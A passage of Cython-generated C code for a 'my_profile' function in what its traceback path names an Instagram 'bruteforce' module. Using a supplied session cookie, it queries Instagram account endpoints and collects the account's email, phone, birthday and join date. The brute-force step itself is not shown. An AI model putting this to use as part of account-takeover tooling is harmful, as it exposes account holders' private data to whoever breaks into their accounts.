  PyObject *__pyx_v_json_object = NULL;
  PyObject *__pyx_v_form_data = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("my_profile", 0);

   
  __pyx_t_1 = __Pyx_PyDict_NewPresized(8); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 161, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_name, Py_None) < 0) __PYX_ERR(0, 161, __pyx_L1_error)

   
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_email, Py_None) < 0) __PYX_ERR(0, 161, __pyx_L1_error)

   
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_phone, Py_None) < 0) __PYX_ERR(0, 161, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_followers, __pyx_int_0) < 0) __PYX_ERR(0, 161, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_following, __pyx_int_0) < 0) __PYX_ERR(0, 161, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_media, __pyx_int_0) < 0) __PYX_ERR(0, 161, __pyx_L1_error)

   
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_created_at, Py_None) < 0) __PYX_ERR(0, 161, __pyx_L1_error)

   
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_birthday, Py_None) < 0) __PYX_ERR(0, 161, __pyx_L1_error)
  __pyx_v_results = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

   
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_2, &__pyx_t_3, &__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_4);
      {

       
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_profile_channel); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 171, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = NULL;
      __pyx_t_7 = 0;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
          __pyx_t_7 = 1;
        }
      }
      #if CYTHON_FAST_PYCALL
      if (PyFunction_Check(__pyx_t_5)) {
        PyObject *__pyx_temp[3] = {__pyx_t_6, __pyx_v_username, __pyx_v_cookie};
        __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_5, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 171, __pyx_L3_error)
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_GOTREF(__pyx_t_1);
      } else
      #endif
      #if CYTHON_FAST_PYCCALL
      if (__Pyx_PyFastCFunction_Check(__pyx_t_5)) {
        PyObject *__pyx_temp[3] = {__pyx_t_6, __pyx_v_username, __pyx_v_cookie};
        __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_5, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 171, __pyx_L3_error)
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_GOTREF(__pyx_t_1);
      } else
      #endif
      {
        __pyx_t_8 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 171, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_8);
        if (__pyx_t_6) {
          __Pyx_GIVEREF(__pyx_t_6); PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_t_6); __pyx_t_6 = NULL;
        }
        __Pyx_INCREF(__pyx_v_username);
        __Pyx_GIVEREF(__pyx_v_username);
        PyTuple_SET_ITEM(__pyx_t_8, 0+__pyx_t_7, __pyx_v_username);
        __Pyx_INCREF(__pyx_v_cookie);
        __Pyx_GIVEREF(__pyx_v_cookie);
        PyTuple_SET_ITEM(__pyx_t_8, 1+__pyx_t_7, __pyx_v_cookie);
        __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_t_8, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 171, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      }
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_CallUnboundCMethod1(&__pyx_umethod_PyDict_Type_update, __pyx_v_results, __pyx_t_1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 171, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

       
    }
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

     
      {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L4_exception_handled;
    }
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_3, __pyx_t_4);
    __pyx_L8_try_end:;
  }

   
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_Http); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 174, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_1 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 174, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_app); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 174, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_IG_REQUEST_HEADERS); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 174, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_headers, __pyx_t_6) < 0) __PYX_ERR(0, 174, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_cookies, __pyx_v_cookie) < 0) __PYX_ERR(0, 174, __pyx_L1_error)
  __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_empty_tuple, __pyx_t_1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 174, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_http = __pyx_t_6;
  __pyx_t_6 = 0;

   
  __Pyx_INCREF(__pyx_int_1);
  __pyx_v_num_retries = __pyx_int_1;

   
  while (1) {

     
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_4, &__pyx_t_3, &__pyx_t_2);
      __Pyx_XGOTREF(__pyx_t_4);
      __Pyx_XGOTREF(__pyx_t_3);
      __Pyx_XGOTREF(__pyx_t_2);
        {

         
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_http, __pyx_n_s_get); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 178, __pyx_L11_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_8 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_8)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_8);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
          }
        }
        __pyx_t_1 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_8, __pyx_kp_u_https_www_instagram_com_accounts) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_kp_u_https_www_instagram_com_accounts);
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 178, __pyx_L11_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_json); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 178, __pyx_L11_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
          }
        }
        __pyx_t_6 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 178, __pyx_L11_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_response, __pyx_t_6);
        __pyx_t_6 = 0;

         
        goto __pyx_L16_try_break;

         
      }
      __pyx_L11_error:;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

       
      __Pyx_ErrFetch(&__pyx_t_6, &__pyx_t_5, &__pyx_t_1);
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_ConnectionError); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 180, __pyx_L13_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_Timeout); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 180, __pyx_L13_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_ChunkedEncodingError); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 180, __pyx_L13_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_7 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_6, __pyx_t_8) || __Pyx_PyErr_GivenExceptionMatches(__pyx_t_6, __pyx_t_9) || __Pyx_PyErr_GivenExceptionMatches(__pyx_t_6, __pyx_t_10);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_ErrRestore(__pyx_t_6, __pyx_t_5, __pyx_t_1);
      __pyx_t_6 = 0; __pyx_t_5 = 0; __pyx_t_1 = 0;
      if (__pyx_t_7) {
        __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.my_profile", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_5, &__pyx_t_6) < 0) __PYX_ERR(0, 180, __pyx_L13_except_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_GOTREF(__pyx_t_6);

         
        goto __pyx_L20_except_continue;
        __pyx_L20_except_continue:;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        goto __pyx_L17_try_continue;
      }

       
        {
        __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.my_profile", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_5, &__pyx_t_1) < 0) __PYX_ERR(0, 182, __pyx_L13_except_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_GOTREF(__pyx_t_1);

         
        __pyx_t_10 = PyObject_RichCompare(__pyx_v_num_retries, __pyx_int_5, Py_GE); __Pyx_XGOTREF(__pyx_t_10); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 183, __pyx_L13_except_error)
        __pyx_t_11 = __Pyx_PyObject_IsTrue(__pyx_t_10); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 183, __pyx_L13_except_error)
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (__pyx_t_11) {

           
          goto __pyx_L21_except_break;

           
        }

         
          {
          __pyx_t_10 = __Pyx_PyInt_AddObjC(__pyx_v_num_retries, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 186, __pyx_L13_except_error)
          __Pyx_GOTREF(__pyx_t_10);
          __Pyx_DECREF_SET(__pyx_v_num_retries, __pyx_t_10);
          __pyx_t_10 = 0;

           
          goto __pyx_L22_except_continue;
        }
        __pyx_L21_except_break:;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        goto __pyx_L16_try_break;
        __pyx_L22_except_continue:;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        goto __pyx_L17_try_continue;
      }
      __pyx_L13_except_error:;

       
      __Pyx_XGIVEREF(__pyx_t_4);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_ExceptionReset(__pyx_t_4, __pyx_t_3, __pyx_t_2);
      goto __pyx_L1_error;
      __pyx_L16_try_break:;
      __Pyx_XGIVEREF(__pyx_t_4);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_ExceptionReset(__pyx_t_4, __pyx_t_3, __pyx_t_2);
      goto __pyx_L10_break;
      __pyx_L17_try_continue:;
      __Pyx_XGIVEREF(__pyx_t_4);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_ExceptionReset(__pyx_t_4, __pyx_t_3, __pyx_t_2);
      goto __pyx_L9_continue;
    }
    __pyx_L9_continue:;
  }
  __pyx_L10_break:;

   
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_2, &__pyx_t_3, &__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_4);
      {

       
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_datetime); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 190, __pyx_L24_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_fromtimestamp); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 190, __pyx_L24_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_v_response)) { __Pyx_RaiseUnboundLocalError("response"); __PYX_ERR(0, 190, __pyx_L24_error) }
      __pyx_t_6 = __Pyx_PyObject_Dict_GetItem(__pyx_v_response, __pyx_n_u_date_joined); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 190, __pyx_L24_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_9 = __Pyx_PyObject_Dict_GetItem(__pyx_t_6, __pyx_n_u_data); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 190, __pyx_L24_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_Dict_GetItem(__pyx_t_9, __pyx_n_u_timestamp); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 190, __pyx_L24_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_5 = (__pyx_t_9) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_9, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_6);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 190, __pyx_L24_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_strftime); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 190, __pyx_L24_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_1 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_5, __pyx_kp_u_d_B_Y_H_I) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_kp_u_d_B_Y_H_I);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 190, __pyx_L24_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(PyDict_SetItem(__pyx_v_results, __pyx_n_u_created_at, __pyx_t_1) < 0)) __PYX_ERR(0, 190, __pyx_L24_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

       
    }
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    goto __pyx_L29_try_end;
    __pyx_L24_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

     
      {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L25_exception_handled;
    }
    __pyx_L25_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_3, __pyx_t_4);
    __pyx_L29_try_end:;
  }

   
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_4, &__pyx_t_3, &__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_2);
      {

       
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_datetime); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 193, __pyx_L30_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_fromtimestamp); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 193, __pyx_L30_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_v_response)) { __Pyx_RaiseUnboundLocalError("response"); __PYX_ERR(0, 193, __pyx_L30_error) }
      __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_v_response, __pyx_n_u_date_of_birth); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 193, __pyx_L30_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_9 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_u_data); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 193, __pyx_L30_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_9, __pyx_n_u_timestamp); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 193, __pyx_L30_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_10 = (__pyx_t_9) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_9, __pyx_t_5) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 193, __pyx_L30_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_strftime); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 193, __pyx_L30_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_1 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_10, __pyx_kp_u_d_B_Y) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_u_d_B_Y);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 193, __pyx_L30_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(PyDict_SetItem(__pyx_v_results, __pyx_n_u_birthday, __pyx_t_1) < 0)) __PYX_ERR(0, 193, __pyx_L30_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

       
    }
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    goto __pyx_L35_try_end;
    __pyx_L30_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

     
      {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L31_exception_handled;
    }
    __pyx_L31_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_ExceptionReset(__pyx_t_4, __pyx_t_3, __pyx_t_2);
    __pyx_L35_try_end:;
  }

   
  __Pyx_INCREF(__pyx_int_1);
  __Pyx_DECREF_SET(__pyx_v_num_retries, __pyx_int_1);

   
  while (1) {

     
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_2, &__pyx_t_3, &__pyx_t_4);
      __Pyx_XGOTREF(__pyx_t_2);
      __Pyx_XGOTREF(__pyx_t_3);
      __Pyx_XGOTREF(__pyx_t_4);
        {

         
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_http, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 199, __pyx_L38_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_10 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
          }
        }
        __pyx_t_1 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_10, __pyx_kp_u_https_www_instagram_com_accounts_2) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_u_https_www_instagram_com_accounts_2);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 199, __pyx_L38_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_text); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 199, __pyx_L38_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF_SET(__pyx_v_response, __pyx_t_6);
